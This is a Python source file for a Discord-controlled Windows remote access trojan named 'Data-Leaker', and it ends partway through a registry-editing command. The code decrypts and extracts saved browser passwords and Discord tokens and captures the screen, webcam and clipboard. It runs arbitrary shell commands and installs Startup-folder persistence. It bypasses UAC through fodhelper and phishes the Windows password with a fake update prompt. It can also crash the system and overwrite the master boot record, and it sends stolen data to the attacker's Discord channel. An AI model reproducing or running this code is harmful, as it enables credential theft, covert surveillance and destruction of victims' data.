"""""!
********************************************************************************
@file   commands.py                   #TODO - OUTSOURCEN DER HELPER FUNCTIONS   
@brief  Contains all bot command definitions and helper functions for the bot
********************************************************************************
"""

import asyncio
import base64
import ctypes
import cv2
import discord
import inspect
import ipaddress
import json
import numpy as np
import os
import psutil
import pyautogui
import random
import re
import requests
import shutil
import socket
import sqlite3
import subprocess
import sys
import threading
import time
import win32gui
import winreg
from base64 import b64decode
from Cryptodome.Cipher import AES
from discord.ext import commands
from mss import mss
from re import findall
from win32crypt import CryptUnprotectData



login = os.getlogin()
dataleaker_dir = os.path.dirname(os.path.abspath(__file__))

# Helper function to get the master key
def get_master_key(path):
    """Retrieve the master key from the browser's local state file."""
    try:
        with open(os.path.join(path, "Local State"), "r", encoding="utf-8") as file:
            local_state = json.load(file)
        encrypted_key = b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception:
        return None

# Helper function to decrypt passwords
def decrypt_password(buff, master_key):
    """Decrypt encrypted passwords."""
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_password = cipher.decrypt(payload)[:-16].decode()
        return decrypted_password
    except Exception:
        return None

# Helper function to extract passwords from a browser's database
def extract_passwords_from_browser(path, master_key):
    """Extract passwords from a browser's database."""
    passwords = []
    login_db = os.path.join(path, "Login Data")
    if not os.path.exists(login_db):
        return passwords

    temp_db = "temp_login_db.db"
    shutil.copy2(login_db, temp_db)

    try:
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for row in cursor.fetchall():
            url, username, encrypted_password = row
            decrypted_password = decrypt_password(encrypted_password, master_key)
            if decrypted_password:
                passwords.append(f"Website: {url}\nUsername: {username}\nPassword: {decrypted_password}")
    except Exception:
        pass
    finally:
        conn.close()
        os.remove(temp_db)

    return passwords

def is_admin():
    """Checks if the program is running with administrator privileges."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() == 1
    except:
        return False

def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    if not os.path.exists(path):
        return []  # Return an empty list if the directory does not exist

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        with open(f'{path}\\{file_name}', errors='ignore') as file:
            for line in [x.strip() for x in file if x.strip()]:
                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                    tokens.extend(re.findall(regex, line))

    return tokens

async def window_logging_callback(bot):
    """Logs active window titles asynchronously."""
    while not bot.stop_threads:
        active_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        print(f"Active window: {active_window}")
        await asyncio.sleep(1)  # Asynchronous sleep instead of time.sleep()

async def dataleakeraccess(title, description):
    pass

async def startup(file_path=""):
	temp = os.getenv("TEMP")
	bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % login
	with open(bat_path + '\\' + "Update.bat", "w+") as bat_file:
		bat_file.write(r'start "" "%s"' % dataleaker_dir)

@commands.command(name="streamscreen")
async def start_screen_streaming(ctx, duration: int):
    """Streams the screen by recording for the specified duration (in seconds). Supports multiple screens."""
    output_file = os.path.join(os.getenv("TEMP"), "recording.mp4")
    fps = 30

    # Use mss to capture all monitors
    with mss.mss() as sct:
        monitors = sct.monitors
        screen_width = sum(monitor["width"] for monitor in monitors[1:])
        screen_height = max(monitor["height"] for monitor in monitors[1:])
        fourcc = cv2.VideoWriter_fourcc(*"mp4v")
        video_writer = cv2.VideoWriter(output_file, fourcc, fps, (screen_width, screen_height))

        try:
            start_time = time.time()
            while time.time() - start_time < duration:
                # Create a blank canvas to merge all screens
                combined_frame = np.zeros((screen_height, screen_width, 3), dtype=np.uint8)
                current_x = 0

                # Capture each monitor and stitch them together
                for monitor in monitors[1:]:
                    screenshot = np.array(sct.grab(monitor))
                    height, width, _ = screenshot.shape
                    combined_frame[0:height, current_x:current_x+width] = screenshot[:, :, :3]
                    current_x += width

                # Write the combined frame to the video file
                video_writer.write(combined_frame)

            video_writer.release()  # Finalize video file

            # Send the file to the Discord channel
            await ctx.send("Recording finished!", file=discord.File(output_file))

            # Clean up the temporary file
            os.remove(output_file)
        except Exception as e:
            video_writer.release()  # Ensure resources are released even if an error occurs
            print(f"Error: {e}")
            await ctx.send("Could not record!")
        
@commands.command(name="cd")
async def change_directory(ctx, *, path: str):
    """Changes the current working directory to the specified path."""
    try:
        os.chdir(path)
        await ctx.send(f"Directory changed to {os.getcwd()}")
    except Exception as e:
        await ctx.send(f"Error changing directory: {e}")

@commands.command(name="download")
async def download_file(ctx, *, filepath: str):
    """Sends the specified file to the Discord channel if it exists."""
    if os.path.exists(filepath):
        await ctx.send(file=discord.File(filepath))
    else:
        await ctx.send("File not found.")

@commands.command(name="upload")
async def upload_file(ctx):
    """Uploads an attached file from the Discord message to the server."""
    if ctx.message.attachments:
        attachment = ctx.message.attachments[0]
        save_path = f"./{attachment.filename}"
        await attachment.save(save_path)
        await ctx.send(f"File uploaded and saved as {save_path}")
    else:
        await ctx.send("No file attached to upload.")

@commands.command(name="message")
async def show_message(ctx, *, text: str):
    """Displays a message box with the specified text on the host system."""
    ctypes.windll.user32.MessageBoxW(0, text, "Message", 1)
    await ctx.send("Message box displayed.")

@commands.command(name="shell")
async def execute_shell(ctx, *, command: str):
    """Executes the given shell command and returns the output."""
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
        await ctx.send(f"```{result}```")
    except subprocess.CalledProcessError as e:
        await ctx.send(f"Error: {e.output}")

@commands.command(name="admincheck")
async def check_admin(ctx):
    """Checks if the bot is running with administrator privileges."""
    if is_admin():
        await ctx.send("Program has admin privileges.")
    else:
        await ctx.send("Program does NOT have admin privileges.")

@commands.command(name="sysinfo")
async def system_info(ctx):
    """Displays basic system information such as OS, processor, and machine details."""
    try:
        import platform
        info = platform.uname()
        sysinfo = (f"System: {info.system}\n"
                   f"Node Name: {info.node}\n"
                   f"Release: {info.release}\n"
                   f"Version: {info.version}\n"
                   f"Machine: {info.machine}\n"
                   f"Processor: {info.processor}")
        await ctx.send(f"```{sysinfo}```")
    except Exception as e:
        await ctx.send(f"Error fetching system info: {e}")


@commands.command(name="delete")
async def delete_file(ctx, *, filepath: str):
    """Deletes the specified file from the host system."""
    try:
        os.remove(filepath)
        await ctx.send(f"Deleted file: {filepath}")
    except Exception as e:
        await ctx.send(f"Error deleting file: {e}")

@commands.command(name="windowstart")
async def start_window_logging(self, ctx):
    """Starts logging active window titles for this session."""
    if self._thread and self._thread.is_alive():
        await ctx.send("[*] Window logging is already running.")
        return

    self.stop_threads = False
    self._thread = threading.Thread(target=self.window_logging_callback, args=(self.bot,))
    self._thread.start()
    await ctx.send("[*] Window logging for this session started")

@commands.command(name="windowstop")
async def stop_window_logging(self, ctx):
    """Stops logging active window titles for this session."""
    if not self._thread or not self._thread.is_alive():
        await ctx.send("[*] Window logging is not currently running.")
        return

    self.stop_threads = True
    self._thread.join()  # Wait for the thread to finish
    self._thread = None
    await ctx.send("[*] Window logging for this session stopped")

    game = discord.Game("Window logging stopped")
    await self.bot.change_presence(status=discord.Status.online, activity=game)

@commands.command(name="voice")
async def voice_command(ctx, *, message: str = None):
    """Speaks the given message using text-to-speech (TTS) on the host system."""
    if not message:
        await ctx.send("Please provide a message for the bot to speak. Usage: `!voice <message>`")
        return
    
    try:
        # Adjust this as needed for your setup
        import win32com.client as wincl
        speak = wincl.Dispatch("SAPI.SpVoice")
        speak.Speak(message)
        await ctx.send("[*] Command successfully executed.")
    except Exception as e:
        await ctx.send(f"An error occurred while executing the command: {e}")

@commands.command(name="write")
async def write_command(ctx, *, message: str = None):
    """Writes the given message using keyboard emulation."""
    if not message:
        await ctx.send("Please provide a message for the bot to write. Usage: `!write \"<message>\"`")
        return

    try:
        # Simulate typing the message
        pyautogui.typewrite(message)

        await ctx.send("[*] Command successfully executed.")
    except Exception as e:
        await ctx.send(f"An error occurred while executing the command: {e}")

@commands.command(name="background")
async def background_command(ctx, *, image_url: str = None):
    """Changes the system background to the provided image URL."""
    if not image_url:
        image_url = "https://c4.wallpaperflare.com/wallpaper/90/932/24/astolfo-fate-apocrypha-astolfo-fate-grand-order-fate-apocrypha-fate-series-anime-hd-wallpaper-preview.jpg"

    try:
        response = requests.get(image_url)
        if response.status_code == 200:
            file_path = os.path.join(os.getenv("TEMP"), "background.jpg")
            with open(file_path, "wb") as f:
                f.write(response.content)
            ctypes.windll.user32.SystemParametersInfoW(20, 0, file_path, 3)
            await ctx.send("[*] New background successfully applied! :3")
        else:
            await ctx.send("[*] Failed to apply new background! :c")
    except Exception as e:
        await ctx.send(f"An error occurred while executing the command: {e}")

@commands.command(name="getclipboard")
async def get_clipboard_command(ctx):
    """Fetches the current content of the clipboard."""
    try:
        output = os.popen("powershell Get-Clipboard").read()
        if output.strip():
            clipboard = f"Clipboard fetched successfully! :3\n\n{output.strip()}"
        else:
            clipboard = "Nothing found in clipboard! :c"
        await ctx.send(clipboard)
    except Exception as e:
        await ctx.send(f"An error occurred while fetching the clipboard: {e}")
        
@commands.command(name="bsod")
async def bsod_command(ctx):
    """Attempts to trigger a Blue Screen of Death (BSOD) on the host system."""
    try:
        await ctx.send("Attempting BSOD...", delete_after=0.1)

        ntdll = ctypes.windll.ntdll
        prev_value = ctypes.c_bool()
        res = ctypes.c_ulong()

        # Adjust privileges
        ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
        
        # Trigger BSOD
        if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
            await ctx.send("BSOD successful! :3")
        else:
            await ctx.send("BSOD failed! :c")
    except Exception as e:
        await ctx.send(f"An error occurred while attempting to trigger BSOD: {e}")   

@commands.command(name="startup")
async def startup_command(ctx):
    """Notifies the user that the bot will launch at startup and executes the startup logic."""
    try:
        embed = discord.Embed(title="🚀 Startup Notification", color=0xFF69B4)
        embed.add_field(name="📂 Status", value="`Data-Leaker will now launch at startup! :3`", inline=False)
        embed.set_footer(text="Startup initiated successfully!")

        await ctx.send(embed=embed)
        await startup()
    except Exception as e:
        await ctx.send(f"An error occurred during startup setup: {e}")        
        
@commands.command(name="exit")
async def exit_command(ctx):
    """Closes the bot and deletes the channel where the command was invoked."""
    try:
        await ctx.channel.delete()
        await ctx.bot.close()
    except Exception as e:
        await ctx.send(f"An error occurred while attempting to exit: {e}")        

@commands.command(name="run")
async def run_command(ctx, *, file: str = None):
    """Executes a file or command on the host system."""
    if not file:
        await ctx.send("Please provide a file or command to run. Usage: `!run <file>`")
        return

    try:
        subprocess.Popen(file, shell=True)
        embed = discord.Embed(title="📂 Data-Leaker - run >w<", color=0xFF69B4)
        embed.add_field(name="📂 Status", value=f"`Started {file}! :3`", inline=False)
        embed.set_footer(text="Execution initiated successfully!")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"An error occurred while attempting to run the file: {e}")
        
@commands.command(name="escalate")
async def escalate_command(ctx):
    """Attempts to escalate privileges to administrator."""

    def is_admin():
        try:
            return os.getuid() == 0
        except AttributeError:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0

    class DisableFsRedirection:
        def __enter__(self):
            self.old_value = ctypes.c_long()
            self.success = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection(ctypes.byref(self.old_value))

        def __exit__(self, exc_type, exc_value, traceback):
            if self.success:
                ctypes.windll.kernel32.Wow64RevertWow64FsRedirection(self.old_value)

    if is_admin():
        await ctx.send("You're already an admin!")
        return

    await ctx.send("Attempting to escalate privileges...")

    exe_running = sys.argv[0].endswith("exe")
    current_dir = inspect.getframeinfo(inspect.currentframe()).filename if not exe_running else sys.argv[0]

    create_reg_path = "powershell New-Item \"HKCU:\\SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\command\" -Force"
    create_trigger_reg_key = "powershell New-ItemProperty -Path \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" -Name \"DelegateExecute\" -Value \"hi\" -Force"
    create_payload_reg_key = (
        f"powershell Set-ItemProperty -Path \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" "
        f"-Name \"(Default)\" -Value \"'cmd /c start {current_dir}'\" -Force"
    )

    try:
        os.system(create_reg_path)
        os.system(create_trigger_reg_key)
        os.system(create_payload_reg_key)

        with DisableFsRedirection():
            os.system("fodhelper.exe")

        time.sleep(2)

        remove_reg = "powershell Remove-Item \"HKCU:\\Software\\Classes\\ms-settings\" -Recurse -Force"
        os.system(remove_reg)

        await ctx.send("Privilege escalation attempted successfully!")
    except Exception as e:
        await ctx.send(f"An error occurred while escalating privileges: {e}")
        
def block_input():
    """Blocks user input if the program has admin rights."""
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    if is_admin:
        ctypes.windll.user32.BlockInput(True)
        return "Inputs blocked successfully!"
    else:
        return "Admin rights are required to block inputs!"

def unblock_input():
    """Unblocks user input if the program has admin rights."""
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    if is_admin:
        ctypes.windll.user32.BlockInput(False)
        return "Inputs unblocked successfully!"
    else:
        return "Admin rights are required to unblock inputs!"      

@commands.command(name="blockinput")
async def blockinput_command(ctx):
    """Blocks user input if the bot has admin rights."""
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    if is_admin:
        ctypes.windll.user32.BlockInput(True)
        embed = discord.Embed(title="🔒 Data-Leaker - Block Input", color=0xFF69B4)
        embed.add_field(name="🔒 Status", value="`Blocked inputs successfully! :3`", inline=False)
        embed.set_footer(text="Input blocking initiated successfully!")
        await ctx.send(embed=embed)
    else:
        embed = discord.Embed(title="🔒 Data-Leaker - Block Input", color=0xFF69B4)
        embed.add_field(name="🔒 Status", value="`Admin rights are required to block inputs, silly :3`", inline=False)
        embed.set_footer(text="Input blocking failed due to insufficient privileges.")
        await ctx.send(embed=embed)

@commands.command(name="unblockinput")
async def unblockinput_command(ctx):
    """Unblocks user input if the bot has admin rights."""
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    if is_admin:
        ctypes.windll.user32.BlockInput(False)
        embed = discord.Embed(title="🔓 Data-Leaker - Unblock Input", color=0xFF69B4)
        embed.add_field(name="🔓 Status", value="`Unblocked inputs successfully! :3`", inline=False)
        embed.set_footer(text="Input unblocking initiated successfully!")
        await ctx.send(embed=embed)
    else:
        embed = discord.Embed(title="🔓 Data-Leaker - Unblock Input", color=0xFF69B4)
        embed.add_field(name="🔓 Status", value="`Admin rights are required to unblock inputs, silly :3`", inline=False)
        embed.set_footer(text="Input unblocking failed due to insufficient privileges.")
        await ctx.send(embed=embed)
        
@commands.command(name="doxx")
async def doxx_command(ctx):
    """Fetches and displays IP-related information of the user."""
    try:
        data = requests.get("https://ipapi.co/json/").json()
        ip = data.get("ip", "N/A")
        ipver = data.get("version", "N/A")
        region = data.get("region", "N/A")
        city = data.get("city", "N/A")
        country = data.get("country", "N/A")
        postal = data.get("postal", "N/A")
        lat = data.get("latitude", "N/A")
        lon = data.get("longitude", "N/A")
        org = data.get("org", "N/A")

        embed = discord.Embed(title="📡 Data-Leaker - Doxx", color=0xFF69B4)
        embed.add_field(name="IP/Version", value=f"`{ip}/{ipver}`", inline=False)
        embed.add_field(name="Country", value=f"`{country}`", inline=False)
        embed.add_field(name="Region", value=f"`{region}`", inline=False)
        embed.add_field(name="City", value=f"`{city}`", inline=False)
        embed.add_field(name="ZIP Code", value=f"`{postal}`", inline=False)
        embed.add_field(name="Latitude/Longitude", value=f"`{lat}/{lon}`", inline=False)
        embed.add_field(name="ISP/Organization", value=f"`{org}`", inline=False)
        embed.set_footer(text="User information fetched successfully! :3")

        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"An error occurred while fetching data: {e}")        

@commands.command(name="windowsphish")
async def windowsphish_command(ctx):
    """Executes a Windows credential phishing command via PowerShell."""
    try:
        fem = "$cred=$host.ui.promptforcredential('Windows Security Update','',[Environment]::UserName,[Environment]::UserDomainName);"
        boy = 'echo $cred.getnetworkcredential().password;'
        full_cmd = f'Powershell "{fem} {boy}"'

        def execute_shell():
            result = subprocess.run(full_cmd, stdout=subprocess.PIPE, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            return result

        output = execute_shell()
        result = output.stdout.decode('CP437').strip()

        await ctx.send("Text transmitted!")
        await ctx.send(f"Password used: `{result}`")
    except Exception as e:
        await ctx.send(f"An error occurred while executing the phishing command: {e}")       
        
@commands.command(name="displayoff")
async def displayoff_command(ctx):
    """Turns off the monitor display if the bot has admin rights."""
    HWND_BROADCAST = 0xFFFF
    WM_SYSCOMMAND = 0x0112
    SC_MONITORPOWER = 0xF170

    try:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin:
            ctypes.windll.user32.SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)
            embed = discord.Embed(title="🔌 Data-Leaker - Display Off", color=0xFF69B4)
            embed.add_field(name="🔌 Status", value="`Screen has been turned off successfully!", inline=False)
            embed.set_footer(text="Monitor power operation successful!")
            await ctx.send(embed=embed)
        else:
            embed = discord.Embed(title="🔌 Data-Leaker - Display Off", color=0xFF69B4)
            embed.add_field(name="🔌 Status", value="`Admin rights are required for this command!`", inline=False)
            embed.set_footer(text="Monitor power operation failed.")
            await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"An error occurred while trying to turn off the display: {e}")        
        
@commands.command(name="displayon")
async def displayon_command(ctx):
    """Turns on the monitor display if the bot has admin rights."""
    HWND_BROADCAST = 0xFFFF
    WM_SYSCOMMAND = 0x0112
    SC_MONITORPOWER = 0xF170

    try:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin:
            ctypes.windll.user32.SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, -1)
            embed = discord.Embed(title="🔌 Data-Leaker - Display On", color=0xFF69B4)
            embed.add_field(name="🔌 Status", value="`Screen has been turned on successfully!", inline=False)
            embed.set_footer(text="Monitor power operation successful!")
            await ctx.send(embed=embed)
        else:
            embed = discord.Embed(title="🔌 Data-Leaker - Display On", color=0xFF69B4)
            embed.add_field(name="🔌 Status", value="`Admin rights are required for this command!", inline=False)
            embed.set_footer(text="Monitor power operation failed.")
            await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"An error occurred while trying to turn on the display: {e}")     

@commands.command(name="extracttokens")
async def tokens_command(ctx):
    """Finds and lists tokens from Discord."""
    import os
    import requests
    from base64 import b64decode
    from Crypto.Cipher import AES
    from win32crypt import CryptUnprotectData
    from json import loads
    from datetime import datetime

    def decrypt(buff, master_key):
        try:
            return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
        except:
            return None

    paths = {
        'Discord': os.getenv('APPDATA') + '\\Discord',
        'Discord Canary': os.getenv('APPDATA') + '\\discordcanary',
        'Discord PTB': os.getenv('APPDATA') + '\\discordptb'
    }

    msg = ""

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        try:
            with open(path + "\\Local State", "r") as file:
                key = loads(file.read())['os_crypt']['encrypted_key']
            key = b64decode(key)[5:]
        except:
            continue

        tokens = []
        for file_name in os.listdir(path + "\\Local Storage\\leveldb\\"):
            if not file_name.endswith(".ldb") and not file_name.endswith(".log"):
                continue

            with open(path + f"\\Local Storage\\leveldb\\{file_name}", "r", errors='ignore') as file:
                for line in file.readlines():
                    for token in line.strip().split():
                        if "dQw4w9WgXcQ:" in token:
                            tokens.append(token.split("dQw4w9WgXcQ:")[1])

        decrypted_tokens = set()  # Use a set to avoid duplicates
        for token in tokens:
            decrypted = decrypt(b64decode(token), key)
            if decrypted:
                decrypted_tokens.add(decrypted)  # Add to the set to ensure uniqueness

        for token in decrypted_tokens:  # Iterate through unique tokens
            headers = {'Authorization': token, 'Content-Type': 'application/json'}
            try:
                user_data = requests.get('https://discord.com/api/v9/users/@me', headers=headers).json()
                nitro_data = requests.get('https://discord.com/api/v9/users/@me/billing/subscriptions', headers=headers).json()
                has_nitro = len(nitro_data) > 0
                days_left = 0

                if has_nitro:
                    d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                    d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                    days_left = abs((d1 - d2).days)

                msg += f"\n- {platform} -\n\n"
                msg += f"Username: {user_data['username']}#{user_data['discriminator']}\n"
                msg += f"Email: {user_data.get('email', 'N/A')}\n"
                msg += f"Phone: {user_data.get('phone', 'N/A')}\n"
                msg += f"2FA: {user_data['mfa_enabled']}\n"
                msg += f"Nitro: {'Yes' if has_nitro else 'No'}\n"
                msg += f"Days left: {days_left}\n"
                msg += f"Token: {token}\n"
            except:
                msg += f"\n- {platform} -\n\nInvalid or expired token.\n"


    embed = discord.Embed(title="🔑 Discord Token Finder", color=0xFF69B4)
    embed.add_field(name="🔑 Token Status", value=f"{msg}" if msg else "No tokens found!", inline=False)
    embed.set_footer(text="Token search completed!")
    await ctx.send(embed=embed)

    
@commands.command(name="critproc")
async def critproc_command(ctx):
    """Makes the bot process critical."""
    try:
        ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0

        embed = discord.Embed(title="🛡️ Data-Leaker - Critical Process", color=0xFF69B4)
        embed.add_field(name="🛡️ Status", value="`dataleakeraccess is now a critical process! :3`", inline=False)
        embed.set_footer(text="Critical process status updated!")
        await ctx.send(embed=embed)
    except Exception as e:
        embed = discord.Embed(title="🛡️ Data-Leaker - Critical Process", color=0xFF69B4)
        embed.add_field(name="🛡️ Status", value=f"`Could not turn dataleakeraccess into a critical process! :c` Error: {e}", inline=False)
        embed.set_footer(text="Critical process status update failed.")
        await ctx.send(embed=embed)    
        
@commands.command(name="uncritproc")
async def uncritproc_command(ctx):
    """Reverts the bot process from being critical."""
    try:
        ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0) == 0

        embed = discord.Embed(title="🛡️ Data-Leaker - Uncritical Process", color=0xFF69B4)
        embed.add_field(name="🛡️ Status", value="`dataleakeraccess is no longer a critical process! :3`", inline=False)
        embed.set_footer(text="Critical process status reverted!")
        await ctx.send(embed=embed)
    except Exception as e:
        embed = discord.Embed(title="🛡️ Data-Leaker - Uncritical Process", color=0xFF69B4)
        embed.add_field(name="🛡️ Status", value=f"`Could not turn dataleakeraccess into a normal process! :c` Error: {e}", inline=False)
        embed.set_footer(text="Failed to revert critical process status.")
        await ctx.send(embed=embed)
        
@commands.command(name="idletime")
async def idletime_command(ctx):
    """Calculates and displays the user's idle time in seconds."""
    class LASTINPUTINFO(ctypes.Structure):
        _fields_ = [
            ('cbSize', ctypes.c_uint),
            ('dwTime', ctypes.c_int),
        ]

    def get_idle_duration():
        lastInputInfo = LASTINPUTINFO()
        lastInputInfo.cbSize = ctypes.sizeof(lastInputInfo)
        if ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lastInputInfo)):
            millis = ctypes.windll.kernel32.GetTickCount() - lastInputInfo.dwTime
            return millis / 1000
        else:
            return 0

    try:
        duration = get_idle_duration()
        embed = discord.Embed(title="⏳ Data-Leaker - Idle Time", color=0xFF69B4)
        embed.add_field(name="⏳ Idle Duration", value=f"`User has been idle for {duration:.2f} seconds! :3`", inline=False)
        embed.set_footer(text="Idle time calculated successfully!")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"An error occurred while calculating idle time: {e}")


@commands.command(name="extractpasswords")
async def extractpasswords_command(ctx):
    """Extract saved passwords from supported browsers."""
    await ctx.send("🔐 Extracting saved passwords from browsers...")

    paths = {
        'Google Chrome': os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default",
        'Microsoft Edge': os.getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data\\Default",
        'Brave Browser': os.getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
        'Opera': os.getenv("APPDATA") + "\\Opera Software\\Opera Stable",
        'Opera GX': os.getenv("APPDATA") + "\\Opera Software\\Opera GX Stable",
        'Vivaldi': os.getenv("LOCALAPPDATA") + "\\Vivaldi\\User Data\\Default",
        'Yandex': os.getenv("LOCALAPPDATA") + "\\Yandex\\YandexBrowser\\User Data\\Default",
        'Firefox': os.getenv("APPDATA") + "\\Mozilla\\Firefox\\Profiles",
    }

    all_passwords = []

    for browser, path in paths.items():
        if not os.path.exists(path):
            continue

        master_key = get_master_key(path)
        if not master_key:
            continue

        passwords = extract_passwords_from_browser(path, master_key)
        if passwords:
            all_passwords.append(f"**{browser}:**\n" + "\n".join(passwords))

    if not all_passwords:
        await ctx.send("🔐 No saved passwords found on this system.")
    else:
        password_list = "\n\n".join(all_passwords)
        await ctx.send(f"🔐 Saved passwords extracted successfully:\n```\n{password_list}\n```")


@commands.command(name="streamscreen")
async def streamscreen_command(ctx, duration: int = None):
    """Starts screen streaming for a specified duration."""
    if duration is None:
        await ctx.send("Usage: `!streamscreen <duration>`")
        return

    try:
        if duration <= 0:
            raise ValueError("Duration must be a positive integer.")

        await start_screen_streaming(ctx, duration)
        embed = discord.Embed(title="📺 Data-Leaker - Stream Screen", color=0xFF69B4)
        embed.add_field(name="📺 Status", value=f"`Screen streaming started for {duration} seconds! :3`", inline=False)
        embed.set_footer(text="Streaming initiated successfully!")
        await ctx.send(embed=embed)
    except ValueError:
        embed = discord.Embed(title="📺 Data-Leaker - Stream Screen", color=0xFF69B4)
        embed.add_field(name="📺 Error", value="`Invalid duration! Please enter a positive integer. :c`", inline=False)
        embed.set_footer(text="Streaming initiation failed.")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"An error occurred while starting screen streaming: {e}")    

@commands.command(name="askescalate")
async def askescalate_command(ctx):
    """Asks the user to escalate privileges to administrator."""
    try:
        await ctx.send("🔒 Asking to escalate privileges :3")
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        embed = discord.Embed(title="🔒 Data-Leaker - Ask Escalate", color=0xFF69B4)
        embed.add_field(name="🔒 Status", value="`Privilege escalation request sent successfully! :3`", inline=False)
        embed.set_footer(text="Privilege escalation process initiated!")
        await ctx.send(embed=embed)
    except Exception as e:
        embed = discord.Embed(title="🔒 Data-Leaker - Ask Escalate", color=0xFF69B4)
        embed.add_field(name="🔒 Error", value=f"`An error occurred while requesting privilege escalation: {e}`", inline=False)
        embed.set_footer(text="Privilege escalation request failed.")
        await ctx.send(embed=embed)    

@commands.command(name="webcampic")
async def webcampic_command(ctx):
    """Takes a picture using the webcam and sends it in the chat."""
    try:
        webcam = cv2.VideoCapture(0, cv2.CAP_DSHOW)
        result, image = webcam.read()
        if result:
            image_path = 'webcam.png'
            cv2.imwrite(image_path, image)
            embed = discord.Embed(title="📸 Data-Leaker - Webcam Picture", color=0xFF69B4)
            embed.add_field(name="📸 Status", value="`Did they say cheese?", inline=False)
            embed.set_footer(text="Webcam capture completed!")
            await ctx.send(embed=embed, file=discord.File(image_path))
            subprocess.run(f'del {image_path}', shell=True)
        else:
            embed = discord.Embed(title="📸 Data-Leaker - Webcam Picture", color=0xFF69B4)
            embed.add_field(name="📸 Error", value="`Failed to capture image from webcam. :c`", inline=False)
            embed.set_footer(text="Webcam capture failed.")
            await ctx.send(embed=embed)
    except Exception as e:
        embed = discord.Embed(title="📸 Data-Leaker - Webcam Picture", color=0xFF69B4)
        embed.add_field(name="📸 Error", value=f"`An error occurred while capturing the image: {e}`", inline=False)
        embed.set_footer(text="Webcam capture failed.")
        await ctx.send(embed=embed)
    finally:
        webcam.release()     

@commands.command(name="masterboot")
async def masterboot_command(ctx):
    """Attempts to overwrite the Master Boot Record (MBR)."""
    GENERIC_WRITE = 0x40000000
    FILE_SHARE_READ = 0x00000001
    FILE_SHARE_WRITE = 0x00000002
    OPEN_EXISTING = 3

    try:
        CreateFileW = ctypes.windll.kernel32.CreateFileW
        WriteFile = ctypes.windll.kernel32.WriteFile
        CloseHandle = ctypes.windll.kernel32.CloseHandle

        hDevice = CreateFileW(
            "\\\\.\\PhysicalDrive0",
            GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            None,
            OPEN_EXISTING,
            0,
            0
        )

        if hDevice == -1:
            raise PermissionError("Could not open PhysicalDrive0. Admin rights may be required.")

        buffer = (ctypes.c_char * 512)()  # Allocate a 512-byte buffer
        written = ctypes.c_ulong()

        if not WriteFile(hDevice, buffer, 512, ctypes.byref(written), None):
            raise IOError("Failed to write to the MBR.")

        CloseHandle(hDevice)

        embed = discord.Embed(title="💾 Data-Leaker - Overwrite MBR", color=0xFF69B4)
        embed.add_field(name="💾 Status", value="`MBR overwritten successfully! :3`", inline=False)
        embed.set_footer(text="Operation completed successfully.")
        await ctx.send(embed=embed)
    except Exception as e:
        embed = discord.Embed(title="💾 Data-Leaker - Overwrite MBR", color=0xFF69B4)
        embed.add_field(name="💾 Error", value=f"`An error occurred: {e}`", inline=False)
        embed.set_footer(text="Operation failed.")
        await ctx.send(embed=embed)        
        
@commands.command(name="regedit")
async def regedit_command(ctx, key_path: str = None, value_name: str = None, new_value: str = None):
    """Edits a Windows registry value."""
    if not key_path or not value_name or not new_value:
        await ctx.send("Usage: `!regedit <key_path> <value_name> <new_value>`")
        return

